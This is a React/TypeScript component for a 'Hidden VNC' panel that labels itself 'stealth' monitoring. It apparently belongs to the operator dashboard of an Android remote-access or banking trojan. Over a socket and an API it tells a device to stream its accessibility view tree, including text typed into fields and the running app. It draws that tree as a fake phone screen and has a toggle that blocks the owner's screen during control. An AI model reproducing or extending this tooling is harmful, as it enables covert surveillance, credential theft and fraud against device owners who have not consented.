"use client";

import { AndroidDevice } from "@/types";
import { useState, useEffect, useRef, useCallback } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Switch } from "@/components/ui/switch";
import { EyeOff, Power, RotateCcw, Loader2, X, Maximize2, Minimize2, Eye, Lock } from "lucide-react";
import { io, Socket } from "socket.io-client";

interface HiddenVNCProps {
  device: AndroidDevice;
}

interface SkeletonEntry {
  text: string;
  type: string;
  x: number;
  y: number;
  width: number;
  height: number;
}

interface SkeletonData {
  package: string;
  device_width: number;
  device_height: number;
  skeleton: SkeletonEntry[];
}

// Color mapping for different view types - vibrant neon colors for better visibility
const getViewTypeBorderColor = (type: string, index: number): string => {
  // Use type-based colors for consistency, with vibrant neon shades
  const typeColorMap: Record<string, string> = {
    text: "#dc2626",           // Deep red
    button: "#34d399",         // Bright green
    edit: "#fbbf24",           // Bright yellow
    imageview: "#60a5fa",      // Bright blue
    framelayout: "#a78bfa",    // Bright purple
    viewgroup: "#fb923c",      // Bright orange
    view: "#22d3ee",           // Bright cyan
  };
  
  const typeLower = type.toLowerCase();
  
  // Return type-specific color if available, otherwise cycle through vibrant colors
  if (typeColorMap[typeLower]) {
    return typeColorMap[typeLower];
  }
  
  // Fallback: cycle through vibrant colors
  const colors = [
    "#60a5fa", // Bright blue
    "#dc2626", // Deep red
    "#34d399", // Bright green
    "#fbbf24", // Bright yellow
  ];
  
  return colors[index % 4];
};

export default function HiddenVNC({ device }: HiddenVNCProps) {
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [skeletonData, setSkeletonData] = useState<SkeletonData | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [currentPackage, setCurrentPackage] = useState<string>("");
  const [isDragging, setIsDragging] = useState(false);
  const [position, setPosition] = useState({ x: 100, y: 100 });
  const [dragOffset, setDragOffset] = useState({ x: 0, y: 0 });
  const [isMinimized, setIsMinimized] = useState(false);
  const [blockScreenEnabled, setBlockScreenEnabled] = useState(false);
  const containerRef = useRef<HTMLDivElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const socketRef = useRef<Socket | null>(null);
  const animationFrameRef = useRef<number | null>(null);
  const popupRef = useRef<HTMLDivElement>(null);
  const titleBarRef = useRef<HTMLDivElement>(null);

  const DEVICE_SERVER_URL = process.env.NEXT_PUBLIC_DEVICE_SERVER_URL || "http://localhost:9211";

  // Handle dragging
  const handleMouseDown = useCallback((e: React.MouseEvent<HTMLDivElement>) => {
    if (!titleBarRef.current || !popupRef.current) return;
    
    const rect = popupRef.current.getBoundingClientRect();
    setDragOffset({
      x: e.clientX - rect.left,
      y: e.clientY - rect.top,
    });
    setIsDragging(true);
  }, []);

  useEffect(() => {
    const handleMouseMove = (e: MouseEvent) => {
      if (!isDragging || !popupRef.current) return;

      const newX = e.clientX - dragOffset.x;
      const newY = e.clientY - dragOffset.y;

      // Keep popup within viewport bounds
      const maxX = window.innerWidth - popupRef.current.offsetWidth;
      const maxY = window.innerHeight - popupRef.current.offsetHeight;

      setPosition({
        x: Math.max(0, Math.min(newX, maxX)),
        y: Math.max(0, Math.min(newY, maxY)),
      });
    };

    const handleMouseUp = () => {
      setIsDragging(false);
    };

    if (isDragging) {
      document.addEventListener("mousemove", handleMouseMove);
      document.addEventListener("mouseup", handleMouseUp);
    }

    return () => {
      document.removeEventListener("mousemove", handleMouseMove);
      document.removeEventListener("mouseup", handleMouseUp);
    };
  }, [isDragging, dragOffset]);

  const handleOpenPopup = () => {
    setIsPopupOpen(true);
    setIsMinimized(false);
    // Center the popup on screen
    setPosition({
      x: (window.innerWidth - 600) / 2,
      y: (window.innerHeight - 600) / 2,
    });
  };

  // Center popup after it's first rendered
  useEffect(() => {
    if (isPopupOpen && popupRef.current && !isMinimized) {
      requestAnimationFrame(() => {
        if (popupRef.current) {
          const rect = popupRef.current.getBoundingClientRect();
          const centerX = (window.innerWidth - rect.width) / 2;
          const centerY = (window.innerHeight - rect.height) / 2;
          setPosition({ x: Math.max(0, centerX), y: Math.max(0, centerY) });
        }
      });
    }
  }, [isPopupOpen]);

  const handleClosePopup = () => {
    setIsPopupOpen(false);
    setIsConnected(false);
    setSkeletonData(null);
  };

  // Setup Socket.IO connection
  useEffect(() => {
    if (!isPopupOpen) return;
    
    console.log(`🔌 [HiddenVNC] Setting up socket for device: ${device.id}`);
    
    if (!socketRef.current) {
      const socket = io(DEVICE_SERVER_URL, {
        transports: ["websocket", "polling"],
      });

      socket.on("connect", () => {
        console.log("✅ [HiddenVNC] Socket connected");
      });

      socket.on("device_event", (event: any) => {
        console.log("📨 [HiddenVNC] Received device event:", event.event);
        
        if (event.event === "skeleton_result" && event.device_id === device.id) {
          console.log("🎯 [HiddenVNC] Skeleton result received:", event.data);
          
          try {
            // Parse the skeleton data
            let parsedSkeleton: SkeletonEntry[] = [];
            
            if (typeof event.data.skeleton === "string") {
              console.log("📝 [HiddenVNC] Skeleton is a string, parsing...");
              parsedSkeleton = JSON.parse(event.data.skeleton);
            } else if (Array.isArray(event.data.skeleton)) {
              console.log("📝 [HiddenVNC] Skeleton is already an array");
              parsedSkeleton = event.data.skeleton;
            }
            
            console.log(`✅ [HiddenVNC] Parsed ${parsedSkeleton.length} skeleton entries`);
            
            const newSkeletonData = {
              package: event.data.package || "",
              device_width: event.data.device_width || 1080,
              device_height: event.data.device_height || 2400,
              skeleton: parsedSkeleton,
            };
            
            setSkeletonData(newSkeletonData);
            setCurrentPackage(event.data.package || "");
            setIsLoading(false);
          } catch (error) {
            console.error("❌ [HiddenVNC] Error parsing skeleton data:", error);
            setIsLoading(false);
          }
        }
      });

      socket.on("disconnect", () => {
        console.log("❌ [HiddenVNC] Socket disconnected");
      });

      socketRef.current = socket;
    }

    return () => {
      if (socketRef.current) {
        console.log("🔌 [HiddenVNC] Cleaning up socket");
        socketRef.current.disconnect();
        socketRef.current = null;
      }
    };
  }, [device.id, DEVICE_SERVER_URL, isPopupOpen]);

  const handleConnect = async () => {
    if (!socketRef.current) {
      console.error("❌ [HiddenVNC] Socket not initialized");
      return;
    }

    console.log("🔌 [HiddenVNC] Connecting...");
    setIsLoading(true);
    setIsConnected(true);

    // Send start-skeleton command
    try {
      const response = await fetch(`${DEVICE_SERVER_URL}/api/devices/${device.id}/command`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          command: "start-skeleton",
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send start-skeleton command");
      }

      console.log("✅ [HiddenVNC] start-skeleton command sent");
    } catch (error) {
      console.error("❌ [HiddenVNC] Error sending start-skeleton command:", error);
      setIsLoading(false);
    }
  };

  const handleDisconnect = () => {
    console.log("🔌 [HiddenVNC] Disconnecting...");
    setIsConnected(false);
    setSkeletonData(null);
    setIsLoading(false);
  };

  const handleRefresh = () => {
    console.log("🔄 [HiddenVNC] Refreshing...");
    setIsLoading(true);
    setSkeletonData(null);
    handleConnect();
  };

  // Block Screen toggle handler
  const handleBlockScreenToggle = useCallback((checked: boolean) => {
    setBlockScreenEnabled(checked);
    const param = checked ? "enable-block-screen|text" : "disable-block-screen|text";
    console.log(`🚫 [HiddenVNC] ${checked ? 'Enabling' : 'Disabling'} block screen`);
    if (!socketRef.current || !socketRef.current.connected || !isConnected) return;
    
    // Send command via socket
    socketRef.current.emit("send-command", {
      deviceId: device.id,
      command: "access-command",
      param: param,
      payload: {},
    });
  }, [isConnected, device.id]);

  // Render skeleton on canvas
  useEffect(() => {
    if (!skeletonData || !canvasRef.current || !containerRef.current || !isConnected) {
      console.log("⏸️ [HiddenVNC] Skipping render:", {
        hasSkeletonData: !!skeletonData,
        hasCanvas: !!canvasRef.current,
        hasContainer: !!containerRef.current,
        isConnected
      });
      return;
    }

    console.log("🎨 [HiddenVNC] Starting render with skeleton data:", {
      package: skeletonData.package,
      device_width: skeletonData.device_width,
      device_height: skeletonData.device_height,
      skeleton_length: skeletonData.skeleton.length,
      skeleton_is_array: Array.isArray(skeletonData.skeleton)
    });

    const canvas = canvasRef.current;
    const ctx = canvas.getContext("2d");
    if (!ctx) {
      console.error("❌ [HiddenVNC] Failed to get canvas context");
      return;
    }

    const container = containerRef.current;
    
    // Wait for container to have dimensions
    if (container.clientWidth === 0 || container.clientHeight === 0) {
      console.log("⏸️ [HiddenVNC] Container has no dimensions, waiting...");
      // Retry after a short delay
      const timeout = setTimeout(() => {
        if (skeletonData && canvasRef.current && containerRef.current) {
          // Force re-render by updating state
          setSkeletonData({ ...skeletonData });
        }
      }, 100);
      return () => clearTimeout(timeout);
    }
    
    // Use fixed dimensions based on phone frame size - medium size
    const containerWidth = 336; // 360px phone width - 24px padding
    const containerHeight = 728; // Proper phone height for 9:19.5 aspect ratio

    console.log("📐 [HiddenVNC] Container dimensions:", {
      containerWidth,
      containerHeight,
      clientWidth: container.clientWidth,
      clientHeight: container.clientHeight
    });

    // Calculate scale to fit device dimensions while maintaining aspect ratio
    const deviceWidth = skeletonData.device_width || 1080;
    const deviceHeight = skeletonData.device_height || 2400;
    
    // Use container dimensions directly for perfect alignment
    const canvasWidth = containerWidth;
    const canvasHeight = containerHeight;
    
    // Calculate the status bar and nav bar heights first
    const statusBarHeightCalc = Math.round(canvasHeight * 0.04);
    const navBarHeightCalc = Math.round(canvasHeight * 0.06);
    
    // Available screen height for actual content (excluding status and nav bars)
    const availableScreenHeight = canvasHeight - statusBarHeightCalc - navBarHeightCalc;
    
    // Calculate scale factors based on available screen area
    const scaleX = canvasWidth / deviceWidth;
    const scaleY = availableScreenHeight / deviceHeight;

    console.log("📐 [HiddenVNC] Canvas dimensions:", {
      canvasWidth,
      canvasHeight,
      scaleX,
      scaleY,
      deviceWidth,
      deviceHeight
    });

    // Set canvas dimensions
    canvas.width = canvasWidth;
    canvas.height = canvasHeight;
    
    // Set CSS size to match
    canvas.style.width = `${canvasWidth}px`;
    canvas.style.height = `${canvasHeight}px`;

    // Clear canvas with Android-like background
    ctx.clearRect(0, 0, canvasWidth, canvasHeight);
    
    // Draw Android status bar area (top) - sleek gradient
    const statusBarHeight = Math.round(canvasHeight * 0.04); // 4% of screen height
    const statusGradient = ctx.createLinearGradient(0, 0, 0, statusBarHeight);
    statusGradient.addColorStop(0, "#1a1a1a");
    statusGradient.addColorStop(1, "#0a0a0a");
    ctx.fillStyle = statusGradient;
    ctx.fillRect(0, 0, canvasWidth, statusBarHeight);
    
    // Draw status bar content - better aligned with glow
    ctx.fillStyle = "#e5e5e5";
    ctx.font = `bold ${Math.round(statusBarHeight * 0.5)}px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif`;
    ctx.textAlign = "left";
    ctx.textBaseline = "middle";
    ctx.fillText("9:41", 16, statusBarHeight / 2);
    
    // Battery icon on right - with gradient fill
    const batteryWidth = 24;
    const batteryHeight = 12;
    const batteryX = canvasWidth - batteryWidth - 16;
    const batteryY = (statusBarHeight - batteryHeight) / 2;
    
    ctx.strokeStyle = "#e5e5e5";
    ctx.lineWidth = 1.5;
    ctx.strokeRect(batteryX, batteryY, batteryWidth, batteryHeight);
    ctx.fillStyle = "#e5e5e5";
    ctx.fillRect(batteryX + batteryWidth, batteryY + 3, 2, batteryHeight - 6);
    
    // Battery fill with gradient
    const batteryGradient = ctx.createLinearGradient(batteryX, 0, batteryX + batteryWidth, 0);
    batteryGradient.addColorStop(0, "#4ade80");
    batteryGradient.addColorStop(1, "#22c55e");
    ctx.fillStyle = batteryGradient;
    ctx.fillRect(batteryX + 2, batteryY + 2, batteryWidth * 0.7, batteryHeight - 4);
    
    // Signal bars - with gradient
    const signalX = batteryX - 40;
    for (let i = 0; i < 4; i++) {
      const barHeight = 3 + (i * 2);
      const barX = signalX + (i * 5);
      const barY = statusBarHeight / 2 + (12 - barHeight) / 2;
      ctx.fillStyle = i < 3 ? "#e5e5e5" : "#4ade80";
      ctx.fillRect(barX, barY, 3, barHeight);
    }
    
    // Draw Android navigation bar area (bottom) - properly aligned
    const navBarHeight = Math.round(canvasHeight * 0.06); // 6% of screen height
    const navBarY = canvasHeight - navBarHeight;
    
    // Main screen area (below status bar, above nav bar)
    const screenStartY = statusBarHeight;
    const screenHeight = navBarY - statusBarHeight;
    
    // Draw main screen background with subtle gradient
    const screenGradient = ctx.createLinearGradient(0, screenStartY, 0, navBarY);
    screenGradient.addColorStop(0, "#0a0a0a");
    screenGradient.addColorStop(0.5, "#000000");
    screenGradient.addColorStop(1, "#0a0a0a");
    ctx.fillStyle = screenGradient;
    ctx.fillRect(0, screenStartY, canvasWidth, screenHeight);

    // Draw skeleton views (offset by status bar)
    if (Array.isArray(skeletonData.skeleton) && skeletonData.skeleton.length > 0) {
      console.log(`🎨 [HiddenVNC] Drawing ${skeletonData.skeleton.length} skeleton entries`);
      console.log(`🎨 [HiddenVNC] Screen area:`, {
        screenStartY,
        screenHeight,
        canvasWidth,
        canvasHeight,
        scaleX,
        scaleY
      });
      
      let drawnCount = 0;
      skeletonData.skeleton.forEach((entry: SkeletonEntry, index: number) => {
        // Scale and position the view
        const x = Math.round(entry.x * scaleX);
        const y = Math.round(entry.y * scaleY) + screenStartY; // Offset by status bar
        const width = Math.round(entry.width * scaleX);
        const height = Math.round(entry.height * scaleY);
        
        // Clamp to visible screen area to prevent overflow
        const clampedX = Math.max(0, Math.min(x, canvasWidth));
        const clampedY = Math.max(screenStartY, Math.min(y, navBarY));
        const clampedWidth = Math.min(width, canvasWidth - clampedX);
        const clampedHeight = Math.min(height, navBarY - clampedY);

        // Skip if dimensions are invalid or out of bounds
        if (clampedWidth <= 0 || clampedHeight <= 0) {
          if (index < 5) {
            console.log(`⏭️ [HiddenVNC] Skipping entry ${index} - invalid or out of bounds:`, {
              original: { x, y, width, height },
              clamped: { x: clampedX, y: clampedY, width: clampedWidth, height: clampedHeight }
            });
          }
          return;
        }
        
        if (index < 5) {
          console.log(`🎨 [HiddenVNC] Drawing entry ${index}:`, {
            type: entry.type,
            text: entry.text?.substring(0, 20),
            original: { x: entry.x, y: entry.y, width: entry.width, height: entry.height },
            scaled: { x, y, width, height },
            clamped: { x: clampedX, y: clampedY, width: clampedWidth, height: clampedHeight },
            borderColor: getViewTypeBorderColor(entry.type, index)
          });
        }

        // Draw clean border without glow using clamped dimensions
        const borderColor = getViewTypeBorderColor(entry.type, index);
        
        ctx.strokeStyle = borderColor;
        ctx.lineWidth = 2;
        ctx.strokeRect(clampedX, clampedY, clampedWidth, clampedHeight);
        
        drawnCount++;

        // Draw text if available - clean without shadow using clamped dimensions
        if (entry.text && entry.text.trim() && clampedWidth > 20 && clampedHeight > 15) {
          const fontSize = Math.max(10, Math.min(14, clampedWidth / 15));
          ctx.font = `500 ${fontSize}px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif`;
          ctx.textAlign = "left";
          ctx.textBaseline = "top";
          
          // Truncate text if too long
          const maxWidth = clampedWidth - 8;
          let displayText = entry.text;
          const metrics = ctx.measureText(displayText);
          if (metrics.width > maxWidth) {
            // Truncate text
            let truncated = "";
            for (let i = 0; i < displayText.length; i++) {
              const testText = displayText.substring(0, i + 1) + "...";
              if (ctx.measureText(testText).width > maxWidth) {
                truncated = displayText.substring(0, i) + "...";
                break;
              }
            }
            displayText = truncated || displayText.substring(0, 10) + "...";
          }
          
          ctx.fillStyle = "#f5f5f5";
          ctx.fillText(displayText, clampedX + 6, clampedY + 6);
        }

        // Draw type label (smaller, in corner) with matching border color using clamped dimensions
        if (clampedWidth > 30 && clampedHeight > 15) {
          const labelFontSize = Math.max(7, Math.min(9, clampedWidth / 30));
          ctx.font = `bold ${labelFontSize}px monospace`;
          ctx.textAlign = "right";
          ctx.textBaseline = "bottom";
          ctx.fillStyle = borderColor;
          ctx.fillText(entry.type, clampedX + clampedWidth - 4, clampedY + clampedHeight - 4);
        }
      });
      
      console.log(`✅ [HiddenVNC] Successfully drew ${drawnCount} out of ${skeletonData.skeleton.length} skeleton entries`);
    } else {
      console.warn("⚠️ [HiddenVNC] No skeleton entries to draw:", {
        skeleton: skeletonData.skeleton,
        length: Array.isArray(skeletonData.skeleton) ? skeletonData.skeleton.length : "N/A",
        type: typeof skeletonData.skeleton
      });
    }
    
    // Draw Android navigation bar area (bottom) - with gradient
    const navGradient = ctx.createLinearGradient(0, navBarY, 0, canvasHeight);
    navGradient.addColorStop(0, "#0a0a0a");
    navGradient.addColorStop(1, "#1a1a1a");
    ctx.fillStyle = navGradient;
    ctx.fillRect(0, navBarY, canvasWidth, navBarHeight);
    
    // Draw navigation gesture bar (modern Android style) - clean
    const gestureBarWidth = 120;
    const gestureBarHeight = 4;
    const gestureBarX = (canvasWidth - gestureBarWidth) / 2;
    const gestureBarY = navBarY + (navBarHeight - gestureBarHeight) / 2;
    
    ctx.fillStyle = "#6b7280";
    ctx.beginPath();
    ctx.roundRect(gestureBarX, gestureBarY, gestureBarWidth, gestureBarHeight, 2);
    ctx.fill();

    // Cancel any pending animation frame
    if (animationFrameRef.current) {
      cancelAnimationFrame(animationFrameRef.current);
    }
  }, [skeletonData, isConnected]);

  return (
    <>
      <div className="p-6 space-y-6">
        <div className="flex items-center gap-3 mb-6">
          <div className="p-2 bg-gradient-to-br from-purple-500 to-pink-600 rounded-lg">
            <EyeOff className="h-6 w-6 text-white" />
          </div>
          <div>
            <h2 className="text-2xl font-bold bg-gradient-to-r from-purple-600 to-pink-600 bg-clip-text text-transparent">
              Hidden VNC
            </h2>
            <p className="text-sm text-muted-foreground">Stealth skeleton view monitoring</p>
          </div>
        </div>

        <Card className="border-2 hover:border-primary/50 transition-colors duration-300 overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-purple-500/5 via-pink-500/5 to-purple-500/5" />
          <CardContent className="p-8 relative">
            <div className="flex flex-col items-center justify-center min-h-[450px] gap-8">
              {/* Animated Icon */}
              <div className="relative">
                <div className="absolute inset-0 bg-gradient-to-r from-purple-500 to-pink-600 rounded-full blur-2xl opacity-20 animate-pulse" />
                <div className="relative p-6 bg-gradient-to-br from-purple-500/10 to-pink-600/10 rounded-2xl border-2 border-primary/20 backdrop-blur-sm">
                  <Eye className="h-20 w-20 text-primary animate-pulse" />
                </div>
              </div>
              
              {/* Text Content */}
              <div className="text-center space-y-3 max-w-lg">
                <h3 className="text-2xl font-bold">Hidden Skeleton View</h3>
                <p className="text-muted-foreground leading-relaxed">
                  Launch a stealth window to monitor the skeleton view of{" "}
                  <span className="font-semibold text-primary">{device.name}</span>
                </p>
                <div className="flex items-center justify-center gap-4 pt-2 text-sm text-muted-foreground">
                  <div className="flex items-center gap-2">
                    <div className="h-2 w-2 bg-purple-500 rounded-full" />
                    Real-time Skeleton
                  </div>
                  <div className="flex items-center gap-2">
                    <div className="h-2 w-2 bg-pink-500 rounded-full" />
                    Draggable Window
                  </div>
                </div>
              </div>
              
              {/* CTA Button */}
              <Button 
                onClick={handleOpenPopup} 
                size="lg" 
                className="gap-3 px-8 py-6 text-lg font-semibold bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 shadow-lg hover:shadow-xl transition-all duration-300 hover:scale-105"
              >
                <EyeOff className="h-6 w-6" />
                Open Skeleton Window
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Draggable Popup Window */}
      {isPopupOpen && (
        <>
          {/* Backdrop with blur */}
          <div 
            className="fixed inset-0 bg-black/20 backdrop-blur-sm z-40 animate-in fade-in duration-300"
            onClick={handleClosePopup}
          />
          
          <div
            ref={popupRef}
            className={`fixed z-50 bg-card border border-primary/30 rounded-2xl shadow-2xl transition-all duration-200 ${
              isMinimized ? "h-auto" : ""
            } ${isDragging ? "scale-[1.02]" : "scale-100"} animate-in zoom-in-95 fade-in duration-200`}
            style={{
              left: `${position.x}px`,
              top: `${position.y}px`,
              width: isMinimized ? "280px" : "auto",
              maxWidth: "95vw",
              maxHeight: "95vh",
              cursor: isDragging ? "grabbing" : "default",
              boxShadow: isDragging 
                ? "0 20px 40px -10px rgba(0, 0, 0, 0.4)" 
                : "0 10px 30px -5px rgba(0, 0, 0, 0.3)",
            }}
          >
            {/* Subtle glow effect */}
            <div className="absolute -inset-px bg-gradient-to-b from-primary/20 via-transparent to-transparent rounded-2xl pointer-events-none" />
            
            {/* Title Bar - Compact */}
            <div
              ref={titleBarRef}
              onMouseDown={handleMouseDown}
              className="relative flex items-center justify-between bg-muted/30 px-3 py-2 rounded-t-2xl cursor-grab active:cursor-grabbing border-b border-border/30 backdrop-blur-sm"
            >
              <div className="flex items-center gap-2 flex-1 min-w-0">
                <div className="p-1 bg-gradient-to-br from-purple-500 to-pink-600 rounded-md flex-shrink-0">
                  <EyeOff className="h-3 w-3 text-white" />
                </div>
                <div className="flex flex-col min-w-0">
                  <span className="font-semibold text-xs truncate">
                    {device.name} - Hidden VNC
                  </span>
                  {currentPackage && (
                    <span className="text-[10px] text-muted-foreground truncate">
                      {currentPackage}
                    </span>
                  )}
                </div>
                {isConnected && (
                  <span className="h-1.5 w-1.5 bg-green-500 rounded-full animate-pulse flex-shrink-0" />
                )}
                {isLoading && (
                  <span className="h-1.5 w-1.5 bg-purple-500 rounded-full animate-ping flex-shrink-0" />
                )}
              </div>
              <div className="flex items-center gap-0.5 flex-shrink-0">
                <Button
                  variant="ghost"
                  size="sm"
                  className="h-6 w-6 p-0 hover:bg-muted rounded-md transition-colors"
                  onClick={() => setIsMinimized(!isMinimized)}
                >
                  {isMinimized ? (
                    <Maximize2 className="h-3 w-3" />
                  ) : (
                    <Minimize2 className="h-3 w-3" />
                  )}
                </Button>
                <Button
                  variant="ghost"
                  size="sm"
                  className="h-6 w-6 p-0 hover:bg-destructive hover:text-destructive-foreground rounded-md transition-all"
                  onClick={handleClosePopup}
                >
                  <X className="h-3 w-3" />
                </Button>
              </div>
            </div>

          {/* Window Content - Compact */}
          {!isMinimized && (
            <div className="relative p-2 space-y-2">
              {/* Screen Display - Compact */}
              {!isConnected ? (
                <div className="flex items-start gap-2 p-2 min-h-[700px]">
                  <div className="w-full max-w-[360px] mx-auto aspect-[9/19.5] bg-gradient-to-br from-muted/50 to-muted rounded-xl flex items-center justify-center border-2 border-dashed border-primary/20 relative overflow-hidden">
                    <div className="absolute inset-0 bg-gradient-to-tr from-purple-500/5 via-pink-500/5 to-purple-500/5 animate-pulse" />
                    
                    <div className="relative text-center text-muted-foreground space-y-3 px-4">
                      <div className="relative inline-block">
                        <div className="absolute inset-0 bg-primary/20 rounded-full blur-xl animate-pulse" />
                        <EyeOff className="relative h-12 w-12 mx-auto text-primary/60" />
                      </div>
                      <div className="space-y-1">
                        <p className="text-sm font-semibold">Ready to Connect</p>
                        <p className="text-xs text-muted-foreground/70">
                          Tap Connect to start
                        </p>
                      </div>
                    </div>
                  </div>
                  
                  {/* Control Sidebar - Not Connected */}
                  <div className="flex flex-col gap-1 bg-muted/20 border p-1 h-full overflow-y-auto w-[50px]">
                    <Button 
                      onClick={handleConnect} 
                      size="sm" 
                      className="h-10 w-full p-0 bg-blue-600 hover:bg-blue-700 text-white"
                      title="Connect"
                    >
                      <Power className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              ) : (
                <div className="flex items-start gap-2 p-2 min-h-[700px]">
                  {/* Screen Display */}
                  <div
                    ref={containerRef}
                    className="flex items-center justify-center bg-gradient-to-br from-slate-50 to-slate-100 dark:from-slate-900 dark:to-slate-950 rounded-xl p-4"
                  >
                  <div className="relative flex justify-center items-center">
                    {/* Phone Frame - Square Design - Medium Size */}
                    <div 
                      className="relative bg-gradient-to-br from-slate-800 via-slate-900 to-black rounded-lg shadow-2xl"
                      style={{
                        boxShadow: "0 30px 90px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.1), inset 0 2px 4px rgba(255, 255, 255, 0.05)",
                        width: "360px",
                        padding: "12px",
                      }}
                    >
                      {/* Screen Bezel with square corners */}
                      <div className="relative bg-black rounded-md p-2 shadow-inner">
                        {/* Top Bar (replacing notch) */}
                        <div className="absolute top-0 left-0 right-0 h-6 bg-black z-20 flex items-center justify-between px-3" 
                             style={{ boxShadow: "0 2px 4px rgba(0, 0, 0, 0.3)" }}>
                          {/* Camera */}
                          <div className="w-2 h-2 bg-slate-700 rounded-full border border-slate-600"></div>
                          {/* Speaker */}
                          <div className="w-16 h-1 bg-slate-700 rounded-full"></div>
                          <div className="w-2 h-2"></div>
                        </div>
                        
                        {/* Screen Area with proper aspect ratio - square corners */}
                        <div className="bg-black rounded-sm overflow-hidden relative" style={{ aspectRatio: "9/19.5", width: "100%" }}>
                          {isLoading && !skeletonData ? (
                            <div className="absolute inset-0 flex flex-col items-center justify-center bg-black text-gray-300">
                              <Loader2 className="h-12 w-12 mb-4 animate-spin opacity-50" />
                              <p className="text-sm">Loading skeleton data...</p>
                              <p className="text-xs mt-2 text-gray-400">Waiting for data from device...</p>
                            </div>
                          ) : skeletonData && Array.isArray(skeletonData.skeleton) && skeletonData.skeleton.length > 0 ? (
                            <canvas
                              ref={canvasRef}
                              className="block w-full h-auto"
                              style={{
                                display: "block",
                                width: "100%",
                                height: "auto",
                                backgroundColor: "#000000",
                              }}
                            />
                          ) : (
                            <div className="absolute inset-0 flex flex-col items-center justify-center bg-black text-gray-300">
                              <EyeOff className="h-12 w-12 mb-4 opacity-50" />
                              <p className="text-sm">Waiting for skeleton data...</p>
                              {skeletonData && (
                                <p className="text-xs mt-2 text-red-400">
                                  Data received but skeleton is {Array.isArray(skeletonData.skeleton) ? `empty (${skeletonData.skeleton.length} items)` : `not an array (${typeof skeletonData.skeleton})`}
                                </p>
                              )}
                            </div>
                          )}
                        </div>
                      </div>
                      
                      {/* Phone Frame Details - Square Style */}
                      {/* Volume buttons (left side) - square */}
                      <div className="absolute -left-1 top-[28%] w-1 h-12 bg-slate-700 shadow-sm"></div>
                      <div className="absolute -left-1 top-[38%] w-1 h-12 bg-slate-700 shadow-sm"></div>
                      
                      {/* Power button (right side) - square */}
                      <div className="absolute -right-1 top-[32%] w-1 h-16 bg-slate-700 shadow-sm"></div>
                    </div>
                    
                    {/* Phone shadow/reflection effect - square */}
                    <div className="absolute inset-0 rounded-lg pointer-events-none"
                         style={{
                           background: "linear-gradient(135deg, rgba(255,255,255,0.1) 0%, transparent 50%, rgba(0,0,0,0.2) 100%)",
                         }}>
                    </div>
                  </div>
                  </div>
                  
                  {/* Control Sidebar - Compact Vertical */}
                  <div className="flex flex-col gap-1 bg-muted/20 border p-1 h-full overflow-y-auto w-[50px]">
                    {/* Connection Controls */}
                    <Button
                      variant="outline"
                      onClick={handleDisconnect}
                      size="sm"
                      className="h-10 w-full p-0 hover:bg-destructive/10"
                      title="Disconnect"
                    >
                      <Power className="h-4 w-4" />
                    </Button>
                    <Button
                      variant="outline"
                      onClick={handleRefresh}
                      size="sm"
                      disabled={isLoading}
                      className="h-10 w-full p-0"
                      title="Refresh"
                    >
                      {isLoading ? (
                        <Loader2 className="h-4 w-4 animate-spin" />
                      ) : (
                        <RotateCcw className="h-4 w-4" />
                      )}
                    </Button>
                    
                    <div className="h-px w-full bg-border/50" />
                    
                    {/* Spacer */}
                    <div className="flex-1 min-h-[20px]" />
                    
                    {/* Block Screen Toggle */}
                    <div className="px-2 py-1.5 flex items-center justify-center gap-1.5">
                      <Lock className="h-3 w-3 text-muted-foreground" />
                      <Switch
                        checked={blockScreenEnabled}
                        onCheckedChange={handleBlockScreenToggle}
                        className="scale-75"
                      />
                    </div>
                  </div>
                </div>
              )}

              {isConnected && skeletonData && (
                <div className="px-2 py-1 bg-muted/50 rounded-lg">
                  <div className="flex flex-wrap gap-1 text-[10px]">
                    <Badge style={{ border: "1px solid #dc2626", backgroundColor: "rgba(220, 38, 38, 0.1)", color: "#dc2626", fontSize: "9px", padding: "1px 4px" }}>Text</Badge>
                    <Badge style={{ border: "1px solid #34d399", backgroundColor: "rgba(52, 211, 153, 0.1)", color: "#34d399", fontSize: "9px", padding: "1px 4px" }}>Button</Badge>
                    <Badge style={{ border: "1px solid #fbbf24", backgroundColor: "rgba(251, 191, 36, 0.1)", color: "#fbbf24", fontSize: "9px", padding: "1px 4px" }}>Edit</Badge>
                    <Badge style={{ border: "1px solid #60a5fa", backgroundColor: "rgba(96, 165, 250, 0.1)", color: "#60a5fa", fontSize: "9px", padding: "1px 4px" }}>Image</Badge>
                    <Badge style={{ border: "1px solid #a78bfa", backgroundColor: "rgba(167, 139, 250, 0.1)", color: "#a78bfa", fontSize: "9px", padding: "1px 4px" }}>Layout</Badge>
                    <Badge style={{ border: "1px solid #22d3ee", backgroundColor: "rgba(34, 211, 238, 0.1)", color: "#22d3ee", fontSize: "9px", padding: "1px 4px" }}>View</Badge>
                  </div>
                  <p className="text-[10px] text-muted-foreground mt-1">
                    {skeletonData.skeleton.length} elements
                  </p>
                </div>
              )}
            </div>
          )}
          </div>
        </>
      )}
    </>
  );
}

